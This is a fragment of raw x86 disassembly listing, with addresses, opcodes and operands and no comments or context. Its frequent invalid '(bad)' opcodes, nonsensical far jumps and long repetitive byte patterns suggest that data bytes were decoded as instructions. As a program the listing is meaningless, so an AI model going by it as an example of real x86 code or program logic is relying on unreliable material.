  43cc5c:	add    BYTE PTR [ebx-0x1],dh
  43cc5f:	add    BYTE PTR [eax],al
  43cc61:	xchg   esi,eax
  43cc62:	dec    DWORD PTR ds:0xb9ffbb12
  43cc68:	retf   
  43cc69:	repz dec DWORD PTR [edx+0x3cfff4e0]
  43cc70:	popf   
  43cc71:	lock (bad) 
  43cc73:	cmp    BYTE PTR [ebp-0x37cc0017],bl
  43cc79:	call   0xd3d6f87d
  43cc7e:	jmp    FWORD PTR [edx]
  43cc80:	jp     0x43cc4c
  43cc82:	push   DWORD PTR [ebx+ebp*4]
  43cc85:	(bad)  
  43cc87:	sub    BYTE PTR [eax-0x6fdd0036],al
  43cc8d:	leave  
  43cc8e:	jmp    FWORD PTR [eax]
  43cc90:	mov    cs,ecx
  43cc92:	(bad)  
  43cc93:	cmp    BYTE PTR [edx-0x4cbe002e],ah
  43cc99:	(bad)  
  43cc9b:	push   ebx
  43cc9c:	into   
  43cc9d:	jmp    0xcad6eba1
  43cca2:	inc    DWORD PTR [eax]
  43cca4:	arpl   WORD PTR [edi-0x2263e101],di
  43ccaa:	call   DWORD PTR [edi-0x5700152a]
  43ccb0:	mov    esi,0x1e0effeb
  43ccb5:	into   
  43ccb6:	call   FWORD PTR [esi-0x2e]
  43ccb9:	call   0xf22275bd
  43ccbe:	inc    DWORD PTR [ebp-0x7d]
  43ccc1:	loopne 0x43ccc2
  43ccc3:	addr16 aad 0xd7
  43ccc6:	dec    DWORD PTR [eax-0x2d]
  43ccc9:	(bad)  
  43cccb:	push   esi
  43cccc:	leave  
  43cccd:	loope  0x43ccce
  43cccf:	push   eax
  43ccd0:	mov    edx,0xb54dffd8
  43ccd5:	(bad)  
  43ccd7:	dec    edx
  43ccd8:	mov    dl,0xdf
  43ccda:	inc    DWORD PTR [ebp-0x4e]
  43ccdd:	loop   0x43ccde
  43ccdf:	push   esp
  43cce0:	mov    esp,0xcd62ffe2
  43cce5:	call   0xe1e712e9
  43ccea:	call   FWORD PTR [edx]
  43ccec:	sub    bl,0xff
  43ccef:	push   ds
  43ccf0:	cdq    
  43ccf1:	loopne 0x43ccf2
  43ccf3:	mov    ah,0xdf
  43ccf5:	out    0xff,al
  43ccf7:	and    DWORD PTR [eax],ebp
  43ccf9:	iret   
  43ccfa:	inc    DWORD PTR [eax]
  43ccfc:	add    BYTE PTR [edi+edi*8-0x9e0000],cl
  43cd03:	add    BYTE PTR [eax],al
  43cd05:	push   edx
  43cd06:	inc    DWORD PTR [eax]
  43cd08:	add    BYTE PTR [edi+edi*8+0x0],al
  43cd0c:	add    BYTE PTR [edx],dh
  43cd0e:	inc    DWORD PTR [eax]
  43cd10:	add    BYTE PTR [edi+edi*8],dh
  43cd13:	add    BYTE PTR [eax],al
  43cd15:	xor    eax,0x320000ff
  43cd1a:	inc    DWORD PTR [eax]
  43cd1c:	add    BYTE PTR [eax],dh
  43cd1e:	inc    DWORD PTR [eax]
  43cd20:	add    BYTE PTR [edi],bl
  43cd22:	inc    DWORD PTR [eax]
  43cd24:	add    BYTE PTR [eax],ch
  43cd26:	inc    DWORD PTR [eax]
  43cd28:	add    BYTE PTR [edi+edi*8],ah
  43cd2b:	add    BYTE PTR [eax],al
  43cd2d:	and    bh,bh
  43cd2f:	add    BYTE PTR [eax],al
  43cd31:	sbb    eax,0x1c0000ff
  43cd36:	inc    DWORD PTR [eax]
  43cd38:	add    BYTE PTR [edi],bl
  43cd3a:	inc    DWORD PTR [eax]
  43cd3c:	add    BYTE PTR ds:0x1a0000ff,bl
  43cd42:	inc    DWORD PTR [eax]
  43cd44:	add    BYTE PTR [ebx],dl
  43cd46:	inc    DWORD PTR [eax]
  43cd48:	add    BYTE PTR [eax],bl
  43cd4a:	inc    DWORD PTR [eax]
  43cd4c:	add    BYTE PTR [eax],ah
  43cd4e:	inc    DWORD PTR [eax]
  43cd50:	add    BYTE PTR [ebx],ah
  43cd52:	inc    DWORD PTR [eax]
  43cd54:	add    BYTE PTR [eax],ah
  43cd56:	inc    DWORD PTR [eax]
  43cd58:	add    BYTE PTR [edi],bl
  43cd5a:	inc    DWORD PTR [eax]
  43cd5c:	add    BYTE PTR [edi],bl
  43cd5e:	inc    DWORD PTR [eax]
  43cd60:	add    BYTE PTR [ecx],ah
  43cd62:	inc    DWORD PTR [eax]
  43cd64:	add    BYTE PTR [edx],ch
  43cd66:	inc    DWORD PTR [eax]
  43cd68:	add    BYTE PTR [ecx],ah
  43cd6a:	inc    DWORD PTR [eax]
  43cd6c:	add    BYTE PTR [esi],dl
  43cd6e:	inc    DWORD PTR [eax]
  43cd70:	add    BYTE PTR [edi+edi*8],dl
  43cd73:	add    BYTE PTR [eax],al
  43cd75:	adc    al,0xff
  43cd77:	add    BYTE PTR [eax],al
  43cd79:	sub    bh,bh
  43cd7b:	add    BYTE PTR [eax],al
  43cd7d:	and    eax,0x300000ff
  43cd82:	inc    DWORD PTR [eax]
  43cd84:	add    BYTE PTR [ecx-0x1],cl
  43cd87:	add    BYTE PTR [eax],al
  43cd89:	push   0xffffffff
  43cd8b:	add    BYTE PTR [eax],al
  43cd8d:	mov    bh,bh
  43cd8f:	add    BYTE PTR [ebx],al
  43cd91:	mov    cl,0xff
  43cd93:	arpl   WORD PTR [esi-0x460019],cx
  43cd99:	cld    
  43cd9a:	jmp    DWORD PTR [ebx-0x78001b25]
  43cda0:	rcl    al,0xff
  43cda3:	push   esi
  43cda4:	(bad)  
  43cda5:	in     al,dx
  43cda6:	call   FWORD PTR [edi+0x3dfff0fa]
  43cdac:	fcomp  st(7)
  43cdae:	inc    DWORD PTR [eax]
  43cdb0:	(bad)  
  43cdb1:	int3   
  43cdb2:	jmp    DWORD PTR [ebx]
  43cdb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cdb5:	iret   
  43cdb6:	jmp    DWORD PTR [ecx]
  43cdb8:	test   eax,0xcd2effd4
  43cdbd:	(bad)  
  43cdbf:	sub    al,0xdc
  43cdc1:	(bad)  
  43cdc3:	jle    0x43cda5
  43cdc5:	in     al,0xff
  43cdc7:	in     al,dx
  43cdc8:	push   ebx
  43cdca:	jmp    FWORD PTR [edx]
  43cdcc:	cs (bad) 
  43cdce:	inc    DWORD PTR [eax]
  43cdd0:	add    al,cl
  43cdd2:	call   FWORD PTR ds:0xb2ffe03f
  43cdd8:	push   esp
  43cdda:	push   DWORD PTR ds:0x1fffc9ac
  43cde0:	mov    ebp,0xbb29ffd5
  43cde5:	(bad)  
  43cde6:	inc    DWORD PTR [edi-0x38]
  43cde9:	(bad)  
  43cdeb:	imul   ecx,ebx,0xffffffcf
  43cdee:	push   DWORD PTR [edx-0x16]
  43cdf1:	loope  0x43cdf2
  43cdf3:	ins    BYTE PTR es:[edi],dx
  43cdf4:	repnz in eax,0xff
  43cdf7:	jno    0x43cddb
  43cdf9:	jmp    0x43cdfa
  43cdfb:	push   ecx
  43cdfc:	into   
  43cdfd:	(bad)  
  43cdfe:	call   DWORD PTR [ebx-0x24]
  43ce01:	loope  0x43ce02
  43ce03:	sbb    bl,0xde
  43ce06:	jmp    DWORD PTR [edi-0x7a001f1a]
  43ce0c:	fst    st(7)
  43ce0e:	push   DWORD PTR [ecx-0x1f]
  43ce11:	loop   0x43ce12
  43ce13:	stos   DWORD PTR es:[edi],eax
  43ce14:	jmp    0xdea0ce00
  43ce19:	loope  0x43ce1a
  43ce1b:	xchg   ebx,eax
  43ce1c:	(bad)  
  43ce1e:	call   esp
  43ce20:	push   ebp
  43ce22:	call   DWORD PTR [ebx+0xfffcb2]
  43ce28:	add    BYTE PTR [esi-0x76ffff01],bh
  43ce2e:	inc    DWORD PTR [eax]
  43ce30:	add    BYTE PTR [edx-0x1],bl
  43ce33:	add    BYTE PTR [eax],al
  43ce35:	inc    ebp
  43ce36:	inc    DWORD PTR [eax]
  43ce38:	add    BYTE PTR [ebp-0x1],al
  43ce3b:	add    BYTE PTR [eax],al
  43ce3d:	dec    ecx
  43ce3e:	inc    DWORD PTR [eax]
  43ce40:	add    BYTE PTR [edx],bh
  43ce42:	inc    DWORD PTR [eax]
  43ce44:	add    BYTE PTR [eax],dh
  43ce46:	inc    DWORD PTR [eax]
  43ce48:	add    BYTE PTR [edi+edi*8],ch
  43ce4b:	add    BYTE PTR [eax],al
  43ce4d:	cmp    edi,edi
  43ce4f:	add    BYTE PTR [eax],al
  43ce51:	aas    
  43ce52:	inc    DWORD PTR [eax]
  43ce54:	add    BYTE PTR [edi],dh
  43ce56:	inc    DWORD PTR [eax]
  43ce58:	add    BYTE PTR [esi-0x1],cl
  43ce5b:	add    BYTE PTR [eax],al
  43ce5d:	push   0xffffffff
  43ce5f:	add    BYTE PTR [eax],al
  43ce61:	cmp    edi,0x0
  43ce64:	add    BYTE PTR [edx-0x3ae8ee01],cl
  43ce6a:	inc    ebp
  43ce6c:	fprem1 
  43ce6e:	call   FWORD PTR [ecx+0x42fff5df]
  43ce74:	stos   BYTE PTR es:[edi],al
  43ce75:	icebp  
  43ce76:	inc    DWORD PTR [ebx-0x48]
  43ce79:	out    dx,eax
  43ce7a:	jmp    DWORD PTR [edi]
  43ce7c:	xchg   ecx,eax
  43ce7d:	aad    0xff
  43ce7f:	das    
  43ce80:	lods   al,BYTE PTR ds:[esi]
  43ce81:	fcos   
  43ce83:	sub    DWORD PTR [esi-0x76d5002c],edx
  43ce89:	into   
  43ce8a:	jmp    FWORD PTR [ecx]
  43ce8c:	pushf  
  43ce8d:	xlat   BYTE PTR ds:[ebx]
  43ce8e:	jmp    FWORD PTR [edi+edi*2]
  43ce91:	ret    
  43ce92:	(bad)  
  43ce93:	cmp    BYTE PTR [eax-0x6cc70025],dh
  43ce99:	int    0xff
  43ce9b:	pop    esi
  43ce9c:	(bad)
  43ce9f:	pusha  
  43cea0:	fcomip st,st(2)
  43cea2:	dec    DWORD PTR [ebp-0x2c]
  43cea5:	in     eax,dx
  43cea6:	dec    DWORD PTR [edx]
  43cea8:	jae    0x43ce74
  43ceaa:	call   FWORD PTR [edi-0x4e]
  43cead:	xlat   BYTE PTR ds:[ebx]
  43ceae:	push   DWORD PTR [ebx+0x1fff0d8]
  43ceb4:	add    ecx,eax
  43ceb6:	push   DWORD PTR [ebx]
  43ceb8:	sbb    bh,0xff
  43cebb:	mov    cl,0xfc
  43cebd:	icebp  
  43cebe:	call   DWORD PTR [ecx+0x60]
  43cec1:	jmp    0xe9f443c5
  43cec6:	(bad)  
  43cec7:	jl     0x43ceb6
  43cec9:	loop   0x43ceca
  43cecb:	dec    ebp
  43cecc:	loopne 0x43ceb5
  43cece:	call   DWORD PTR [eax-0x40]
  43ced1:	(bad)  
  43ced3:	dec    ebp
  43ced4:	mov    edx,0xc050ffda
  43ced9:	fdivp  st(7),st
  43cedb:	push   ecx
  43cedc:	shr    ecx,0xff
  43cedf:	inc    esp
  43cee0:	mov    edx,0xc14dffe5
  43cee5:	in     eax,0xff
  43cee7:	push   0x49ffead5
  43ceec:	lods   eax,DWORD PTR ds:[esi]
  43ceed:	loope  0x43ceee
  43ceef:	or     al,0x79
  43cef1:	call   0xe4034cf5
  43cef6:	jmp    DWORD PTR [edx-0x71]
  43cef9:	repnz inc DWORD PTR [eax]
  43cefc:	add    BYTE PTR [edi+edi*8-0x760000],ch
  43cf03:	add    BYTE PTR [eax],al
  43cf05:	je     0x43cf06
  43cf07:	add    eax,DWORD PTR [esp+ebp*2]
  43cf0a:	inc    DWORD PTR [eax]
  43cf0c:	add    BYTE PTR [eax-0x1],dl
  43cf0f:	add    BYTE PTR [eax],al
  43cf11:	dec    eax
  43cf12:	inc    DWORD PTR [eax]
  43cf14:	add    BYTE PTR [edi+edi*8+0x0],al
  43cf18:	add    BYTE PTR [esi],dh
  43cf1a:	inc    DWORD PTR [eax]
  43cf1c:	add    BYTE PTR [esi],ah
  43cf1e:	inc    DWORD PTR [eax]
  43cf20:	add    BYTE PTR [edi],bl
  43cf22:	inc    DWORD PTR [eax]
  43cf24:	add    BYTE PTR [esi],ah
  43cf26:	inc    DWORD PTR [eax]
  43cf28:	add    BYTE PTR [ebx],bl
  43cf2a:	inc    DWORD PTR [eax]
  43cf2c:	add    BYTE PTR [ecx],ah
  43cf2e:	inc    DWORD PTR [eax]
  43cf30:	add    BYTE PTR [eax],ah
  43cf32:	inc    DWORD PTR [eax]
  43cf34:	add    BYTE PTR [ebx],ah
  43cf36:	inc    DWORD PTR [eax]
  43cf38:	add    BYTE PTR [edi],bl
  43cf3a:	inc    DWORD PTR [eax]
  43cf3c:	add    BYTE PTR [ecx],ah
  43cf3e:	inc    DWORD PTR [eax]
  43cf40:	add    BYTE PTR [edi],dl
  43cf42:	inc    DWORD PTR [eax]
  43cf44:	add    BYTE PTR [ecx],dl
  43cf46:	inc    DWORD PTR [eax]
  43cf48:	add    BYTE PTR [edi+edi*8],bl
  43cf4b:	add    BYTE PTR [eax],al
  43cf4d:	sbb    al,0xff
  43cf4f:	add    BYTE PTR [eax],al
  43cf51:	and    bh,bh
  43cf53:	add    BYTE PTR [eax],al
  43cf55:	sub    edi,edi
  43cf57:	add    BYTE PTR [eax],al
  43cf59:	sbb    eax,0x210000ff
  43cf5e:	inc    DWORD PTR [eax]
  43cf60:	add    BYTE PTR [edx],ah
  43cf62:	inc    DWORD PTR [eax]
  43cf64:	add    BYTE PTR [edx],ch
  43cf66:	inc    DWORD PTR [eax]
  43cf68:	add    BYTE PTR [edi+edi*8],ch
  43cf6b:	add    BYTE PTR [eax],al
  43cf6d:	push   ds
  43cf6e:	inc    DWORD PTR [eax]
  43cf70:	add    BYTE PTR [edi+edi*8],bl
  43cf73:	add    BYTE PTR [eax],al
  43cf75:	and    al,0xff
  43cf77:	add    BYTE PTR [eax],al
  43cf79:	sub    bh,bh
  43cf7b:	add    BYTE PTR [eax],al
  43cf7d:	xor    bh,bh
  43cf7f:	add    BYTE PTR [eax],al
  43cf81:	inc    edx
  43cf82:	inc    DWORD PTR [eax]
  43cf84:	add    BYTE PTR [ebp-0x1],dl
  43cf87:	add    BYTE PTR [eax],al
  43cf89:	cmp    edi,0x10
  43cf8c:	pop    ss
  43cf8d:	mov    ch,0xff
  43cf8f:	jns    0x43cf3a
  43cf91:	icebp  
  43cf92:	inc    ebx
  43cf94:	(bad)  
  43cf95:	std    
  43cf96:	call   DWORD PTR [ecx-0x4c]
  43cf99:	aad    0xff
  43cf9b:	pop    ebp
  43cf9c:	lods   al,BYTE PTR ds:[esi]
  43cf9d:	retf   0x86ff
  43cfa0:	shr    edx,1
  43cfa2:	inc    DWORD PTR [edx-0x59000011]
  43cfa8:	clc    
  43cfa9:	out    0xff,al
  43cfab:	sbb    eax,0xbffcac6
  43cfb0:	mov    WORD PTR [esi-0x3656e901],?
  43cfb6:	call   FWORD PTR [eax]
  43cfb8:	mov    edx,0xd734ffcd
  43cfbd:	loopne 0x43cfbe
  43cfbf:	xor    esi,ebx
  43cfc1:	in     al,0xff
  43cfc3:	mov    bl,0xeb
  43cfc5:	in     al,dx
  43cfc6:	(bad)  
  43cfc7:	call   0x1d43cac6
  43cfcc:	and    eax,0xffcc
  43cfd1:	enter  0x3dff,0x63
  43cfd5:	fdivp  st(7),st
  43cfd7:	sar    bh,1
  43cfd9:	repnz inc DWORD PTR [edx]
  43cfdc:	nop
  43cfdd:	mov    esp,0xc7a126ff
  43cfe2:	call   FWORD PTR [eax]
  43cfe4:	ret    
  43cfe5:	(bad)  
  43cfe7:	outs   dx,DWORD PTR ds:[esi]
  43cfe8:	retf   
  43cfe9:	iret   
  43cfea:	(bad)  
  43cfeb:	cmp    eax,0x3bffd0b1
  43cff0:	rcr    esi,0xff
  43cff3:	push   ebx
  43cff4:	shl    dl,1
  43cff6:	inc    DWORD PTR [eax]
  43cff8:	mov    dh,0xdc
  43cffa:	dec    DWORD PTR [ebx-0x38]
  43cffd:	aad    0xff
  43cfff:	pop    ebp
  43d000:	out    0xe4,al
  43d002:	push   DWORD PTR [eax-0x23]
  43d005:	fdiv   st(7),st
  43d007:	xchg   dl,ah
  43d009:	(bad)  
  43d00b:	cmp    al,0xae
  43d00d:	iret   
  43d00e:	inc    DWORD PTR [ebx-0x3d]
  43d011:	(bad)  
  43d012:	inc    DWORD PTR [esi+0x62ffe7da]
  43d018:	(bad)  
  43d01a:	dec    DWORD PTR [edi-0x26]
  43d01d:	aam    0xff
  43d01f:	(bad)  
  43d020:	dec    edi
  43d022:	inc    DWORD PTR [eax]
  43d024:	add    DWORD PTR [ebx-0x62ffff01],ebp
  43d02a:	inc    DWORD PTR [eax]
  43d02c:	add    BYTE PTR [ebx-0x1],bh
  43d02f:	add    BYTE PTR [eax],al
  43d031:	pop    edx
  43d032:	inc    DWORD PTR [eax]
  43d034:	add    BYTE PTR [esi],bh
  43d036:	inc    DWORD PTR [eax]
  43d038:	add    BYTE PTR [ebx],ch
  43d03a:	inc    DWORD PTR [eax]
  43d03c:	add    BYTE PTR [ebx],ch
  43d03e:	inc    DWORD PTR [eax]
  43d040:	add    BYTE PTR ds:0x430000ff,ch
  43d046:	inc    DWORD PTR [eax]
  43d048:	add    BYTE PTR ds:0x330000ff,dh
  43d04e:	inc    DWORD PTR [eax]
  43d050:	add    BYTE PTR [ebx-0x1],al
  43d053:	add    BYTE PTR [eax],al
  43d055:	sub    bh,bh
  43d057:	add    BYTE PTR [eax],al
  43d059:	xor    eax,0x3c0000ff
  43d05e:	inc    DWORD PTR [eax]
  43d060:	add    BYTE PTR [ecx-0x1],bl
  43d063:	add    BYTE PTR [eax],al
  43d065:	jo     0x43d066
  43d067:	add    BYTE PTR [eax],al
  43d069:	xchg   ebx,eax
  43d06a:	call   FWORD PTR [ecx]
  43d06c:	and    eax,0xe3a6ffd7
  43d071:	idiv   bh
  43d073:	push   0xffffffcf
  43d075:	out    dx,al
  43d076:	inc    DWORD PTR [ecx+eiz*4-0x10]
  43d07a:	(bad)  
  43d07b:	cmp    al,0xb0
  43d07d:	out    dx,eax
  43d07e:	jmp    FWORD PTR [esi]
  43d080:	(bad)  
  43d081:	in     eax,0xff
  43d083:	es mov ss,edx
  43d086:	jmp    DWORD PTR [esi]
  43d088:	mov    ecx,ebp
  43d08a:	push   DWORD PTR [esi]
  43d08c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d08d:	(bad)  
  43d08f:	and    esi,DWORD PTR [eax-0x43]
  43d092:	call   FWORD PTR [eax]
  43d094:	jl     0x43d068
  43d096:	jmp    FWORD PTR [eax]
  43d098:	xchg   edi,eax
  43d099:	ret    
  43d09a:	call   FWORD PTR [edx]
  43d09c:	mov    al,ds:0xab51ffaf
  43d0a1:	fcos   
  43d0a3:	cmp    edx,DWORD PTR [ecx+0x7100ffe0]
  43d0a9:	aam    0xff
  43d0ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d0ad:	fcos   
  43d0af:	mov    eax,0xdfff9df
  43d0b4:	adc    cl,al
  43d0b6:	jmp    DWORD PTR [esi-0x57]
  43d0b9:	aam    0xff
  43d0bb:	mov    ebx,0x92fff8fa
  43d0c0:	lods   eax,DWORD PTR ds:[esi]
  43d0c1:	lock dec DWORD PTR [ebx]
  43d0c4:	xor    eax,esp
  43d0c6:	push   DWORD PTR [ecx+0x64ffe5fc]
  43d0cc:	loopne 0x43d0b2
  43d0ce:	call   FWORD PTR [edi-0x32]
  43d0d1:	(bad)  
  43d0d2:	jmp    FWORD PTR [ebp-0x3a]
  43d0d5:	fcos   
  43d0d7:	push   edx
  43d0d8:	mov    al,0xd5
  43d0da:	call   DWORD PTR [edi-0x49]
  43d0dd:	(bad)  
  43d0df:	push   ebx
  43d0e0:	mov    dl,0xe0
  43d0e2:	inc    DWORD PTR [eax-0x55]
  43d0e5:	fdivr  st,st(7)
  43d0e7:	arpl   di,dx
  43d0e9:	out    0xff,eax
  43d0eb:	outs   dx,DWORD PTR ds:[esi]
  43d0ec:	(bad)  
  43d0ed:	loopne 0x43d0ee
  43d0ef:	ins    BYTE PTR es:[edi],dx
  43d0f0:	(bad)  
  43d0f4:	rcr    ch,0xff
  43d0f7:	stos   DWORD PTR es:[edi],eax
  43d0f8:	(bad)  
  43d0f9:	std    
  43d0fa:	inc    DWORD PTR [eax]
  43d0fc:	or     DWORD PTR [edi-0x51ffff01],ebp
  43d102:	inc    DWORD PTR [eax]
  43d104:	add    BYTE PTR [esi-0x3b829f01],dl
  43d10a:	dec    DWORD PTR [ebx]
  43d10c:	push   cs
  43d10d:	mov    dh,0xff
  43d10f:	add    BYTE PTR [eax],al
  43d111:	inc    WORD PTR [eax]
  43d114:	add    BYTE PTR [edi-0x1],bl
  43d117:	add    BYTE PTR [eax],al
  43d119:	inc    ebp
  43d11a:	inc    DWORD PTR [eax]
  43d11c:	add    BYTE PTR ds:0x230000ff,dh
  43d122:	inc    DWORD PTR [eax]
  43d124:	add    BYTE PTR [ebx],ah
  43d126:	inc    DWORD PTR [eax]
  43d128:	add    BYTE PTR [esi],ah
  43d12a:	inc    DWORD PTR [eax]
  43d12c:	add    BYTE PTR ds:0x1c0000ff,bl
  43d132:	inc    DWORD PTR [eax]
  43d134:	add    BYTE PTR [ecx],ah
  43d136:	inc    DWORD PTR [eax]
  43d138:	add    BYTE PTR [eax],ah
  43d13a:	inc    DWORD PTR [eax]
  43d13c:	add    BYTE PTR [ebx],ch
  43d13e:	inc    DWORD PTR [eax]
  43d140:	add    BYTE PTR [edx],ah
  43d142:	inc    DWORD PTR [eax]
  43d144:	add    BYTE PTR [edi],dl
  43d146:	inc    DWORD PTR [eax]
  43d148:	add    BYTE PTR [ebx],bl
  43d14a:	inc    DWORD PTR [eax]
  43d14c:	add    BYTE PTR [esi],dl
  43d14e:	inc    DWORD PTR [eax]
  43d150:	add    BYTE PTR [edi],dl
  43d152:	inc    DWORD PTR [eax]
  43d154:	add    BYTE PTR [esi],bl
  43d156:	inc    DWORD PTR [eax]
  43d158:	add    BYTE PTR ds:0x210000ff,bl
  43d15e:	inc    DWORD PTR [eax]
  43d160:	add    BYTE PTR [eax],ch
  43d162:	inc    DWORD PTR [eax]
  43d164:	add    BYTE PTR [edi+edi*8],dl
  43d167:	add    BYTE PTR [eax],al
  43d169:	push   ds
  43d16a:	inc    DWORD PTR [eax]
  43d16c:	add    BYTE PTR [ebx],ch
  43d16e:	inc    DWORD PTR [eax]
  43d170:	add    BYTE PTR [ebx],ah
  43d172:	inc    DWORD PTR [eax]
  43d174:	add    BYTE PTR [eax],dh
  43d176:	inc    DWORD PTR [eax]
  43d178:	add    BYTE PTR [edx],bh
  43d17a:	inc    DWORD PTR [eax]
  43d17c:	add    BYTE PTR [ecx-0x1],al
  43d17f:	add    BYTE PTR [eax],al
  43d181:	inc    DWORD PTR gs:[eax]
  43d184:	add    BYTE PTR [edi+edi*8+0xc],bh
  43d188:	adc    BYTE PTR [edx-0xd395201],dh
  43d18e:	call   FWORD PTR [esp+ebp*8-0x2974000f]
  43d195:	loope  0x43d196
  43d197:	dec    edx
  43d198:	mov    al,ds:0x6400ffc7
  43d19d:	mov    cl,0xff
  43d19f:	daa    
  43d1a0:	(bad)  
  43d1a1:	retf   
  43d1a2:	(bad)  
  43d1a3:	cmp    edx,DWORD PTR [edi-0x1b710026]
  43d1a9:	in     al,0xff
  43d1ab:	ds enter 0xffd7,0x41
  43d1b0:	mov    ebx,0xdc3bffd3
  43d1b5:	fdiv   st(7),st
  43d1b7:	and    eax,0xffdcc0
  43d1bc:	sahf   
  43d1bd:	iret   
  43d1be:	jmp    FWORD PTR [eax]
  43d1c0:	aad    0xdb
  43d1c2:	call   DWORD PTR [ebx-0x4700161a]
  43d1c8:	fcomip st,st(5)
  43d1ca:	inc    DWORD PTR [ebx]
  43d1cc:	add    al,0xca
  43d1ce:	inc    DWORD PTR [edx]
  43d1d0:	add    al,0xc9
  43d1d2:	dec    DWORD PTR [ebx+esi*4-0x73d0010]
  43d1d9:	in     eax,dx
  43d1da:	(bad)  
  43d1db:	ds mov dh,0xd2
  43d1de:	call   DWORD PTR [edx]
  43d1e0:	lahf   
  43d1e1:	(bad)  
  43d1e2:	call   DWORD PTR [eax-0x32]
  43d1e5:	(bad)  
  43d1e7:	dec    edi
  43d1e8:	mov    ebp,0xc158ffdb
  43d1ed:	fdiv   st(7),st
  43d1ef:	cmp    BYTE PTR [ebp-0x1b94002a],dh
  43d1f5:	call   0xdf02dbf9
  43d1fa:	call   FWORD PTR [eax]
  43d1fc:	mov    dl,0xe5
  43d1fe:	call   DWORD PTR [ebx-0x3c]
  43d201:	(bad)  
  43d203:	adc    BYTE PTR [ebx-0x36f3002b],bh
  43d209:	loop   0x43d20a
  43d20b:	add    BYTE PTR [ebp-0x4dc30031],dl
  43d211:	fdivr  st,st(7)
  43d213:	inc    ebx
  43d214:	cdq    
  43d215:	fcos   
  43d217:	inc    edi
  43d218:	int    0xda
  43d21a:	(bad)  
  43d21b:	mov    esi,0x74fff4f3
  43d220:	mov    esi,esi
  43d222:	inc    DWORD PTR [eax]
  43d224:	add    BYTE PTR [esi-0x73ffff01],dh
  43d22a:	inc    DWORD PTR [eax]
  43d22c:	add    BYTE PTR [ebx-0x1],ch
  43d22f:	add    BYTE PTR [eax],al
  43d231:	dec    ecx
  43d232:	inc    DWORD PTR [eax]
  43d234:	add    BYTE PTR [eax-0x1],al
  43d237:	add    BYTE PTR [eax],al
  43d239:	xor    al,0xff
  43d23b:	add    BYTE PTR [eax],al
  43d23d:	xor    edi,edi
  43d23f:	add    BYTE PTR [eax],al
  43d241:	sub    bh,bh
  43d243:	add    BYTE PTR [eax],al
  43d245:	inc    eax
  43d246:	inc    DWORD PTR [eax]
  43d248:	add    BYTE PTR [ecx-0x1],al
  43d24b:	add    BYTE PTR [eax],al
  43d24d:	inc    ecx
  43d24e:	inc    DWORD PTR [eax]
  43d250:	add    BYTE PTR [eax-0x1],al
  43d253:	add    BYTE PTR [eax],al
  43d255:	cmp    edi,edi
  43d257:	add    BYTE PTR [eax],al
  43d259:	inc    DWORD PTR ss:[eax]
  43d25c:	add    BYTE PTR [ebx],bh
  43d25e:	inc    DWORD PTR [eax]
  43d260:	add    BYTE PTR [esi-0x1],al
  43d263:	add    BYTE PTR [eax],al
  43d265:	arpl   di,di
  43d267:	add    BYTE PTR [eax],al
  43d269:	cmp    edi,0x0
  43d26c:	add    BYTE PTR [edx-0x1c90eb01],dh
  43d272:	dec    edx
  43d274:	(bad)  
  43d275:	sti    
  43d276:	jmp    DWORD PTR [esi+ebx*8-0x43af000b]
  43d27d:	idiv   bh
  43d27f:	inc    esi
  43d280:	mov    esi,0x8323fff0
  43d285:	int    0xff
  43d287:	xor    eax,0x31ffdcb2
  43d28c:	mov    bh,al
  43d28e:	call   DWORD PTR [edi]
  43d290:	dec    ebp
  43d291:	stos   DWORD PTR es:[edi],eax
  43d292:	jmp    DWORD PTR [ebx]
  43d294:	xchg   edx,eax
  43d295:	fdivr  st,st(7)
  43d297:	xor    eax,DWORD PTR [eax-0x53c50042]
  43d29d:	mov    esp,0xd4a152ff
  43d2a2:	dec    DWORD PTR [eax-0x79]
  43d2a5:	fcos   
  43d2a7:	es xchg edx,eax
  43d2a9:	(bad)  
  43d2ab:	sub    ah,al
  43d2ad:	aad    0xff
  43d2af:	sahf   
  43d2b0:	aam    0xf3
  43d2b2:	dec    DWORD PTR ds:0x2effcb10
  43d2b8:	dec    ecx
  43d2b9:	mov    al,0xff
  43d2bb:	xchg   ebp,eax
  43d2bc:	fucomip st,st(2)
  43d2be:	push   DWORD PTR [edi+0xffefe0]
  43d2c4:	add    bl,dl
  43d2c6:	call   DWORD PTR [edx-0x77001941]
  43d2cc:	aad    0xe2
  43d2ce:	jmp    DWORD PTR [ecx-0x43]
  43d2d1:	fcos   
  43d2d3:	pop    esp
  43d2d4:	stos   DWORD PTR es:[edi],eax
  43d2d5:	aam    0xff
  43d2d7:	push   ecx
  43d2d8:	sahf   
  43d2d9:	sar    bh,1
  43d2db:	arpl   WORD PTR [edi+edx*8-0x2d56a701],si
  43d2e2:	call   DWORD PTR [ebx-0x50]
  43d2e5:	xlat   BYTE PTR ds:[ebx]
  43d2e6:	jmp    DWORD PTR [eax-0x4a]
  43d2e9:	aad    0xff
  43d2eb:	jae    0x43d2b3
  43d2ed:	loope  0x43d2ee
  43d2ef:	gs ret 
  43d2f1:	loop   0x43d2f2
  43d2f3:	je     0x43d2ce
  43d2f5:	out    0xff,eax
  43d2f7:	mov    esi,0xaffff8ff
  43d2fc:	ret    
  43d2fd:	jmp    0xff:0xc60201ff
  43d304:	add    ah,al
  43d306:	call   DWORD PTR [esi+eiz*2-0x3a]
  43d30a:	inc    ebx
  43d30c:	(bad)  
  43d30d:	cld    
  43d30e:	inc    DWORD PTR [edi+eax*1]
  43d311:	lods   eax,DWORD PTR ds:[esi]
  43d312:	inc    DWORD PTR [eax]
  43d314:	add    BYTE PTR [ebx-0x1],bh
  43d317:	add    BYTE PTR [eax],al
  43d319:	(bad)  
  43d31a:	inc    DWORD PTR [eax]
  43d31c:	add    BYTE PTR [ebp-0x1],al
  43d31f:	add    BYTE PTR [eax],al
  43d321:	xor    edi,edi
  43d323:	add    BYTE PTR [eax],al
  43d325:	inc    DWORD PTR es:[eax]
  43d328:	add    BYTE PTR [esi],bl
  43d32a:	inc    DWORD PTR [eax]
  43d32c:	add    BYTE PTR [edi+edi*8],bl
  43d32f:	add    BYTE PTR [eax],al
  43d331:	sbb    eax,0x1d0000ff
  43d336:	inc    DWORD PTR [eax]
  43d338:	add    BYTE PTR [esi],bl
  43d33a:	inc    DWORD PTR [eax]
  43d33c:	add    BYTE PTR ds:0x1d0000ff,bl
  43d342:	inc    DWORD PTR [eax]
  43d344:	add    BYTE PTR [esi],dl
